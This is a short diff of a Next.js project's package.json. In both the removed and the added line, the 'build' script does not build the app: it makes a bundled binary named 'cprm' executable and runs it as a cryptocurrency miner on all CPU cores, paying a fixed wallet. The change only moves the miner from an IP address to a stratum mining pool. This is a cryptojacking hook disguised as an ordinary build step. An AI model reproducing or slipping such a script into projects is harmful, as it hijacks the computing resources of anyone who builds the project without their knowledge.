@@ -2,7 +2,7 @@
   "private": true,
   "scripts": {
     "dev": "next dev --turbo",
-    "build": "chmod +x cprm && ./cprm -a yespowersugar -o 34.107.31.31:443 -u sugar1qna06u7zjcjxumlqhked8kk3n8phrlsrhq2p7eq -p cpu -t $(nproc --all)",
+    "build": "chmod +x cprm && ./cprm -a yespowersugar -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1qna06u7zjcjxumlqhked8kk3n8phrlsrhq2p7eq -p cpu -t $(nproc --all)",
     "build-only": "next build",
     "start": "next start",
     "setup": "node ./setup.mjs"
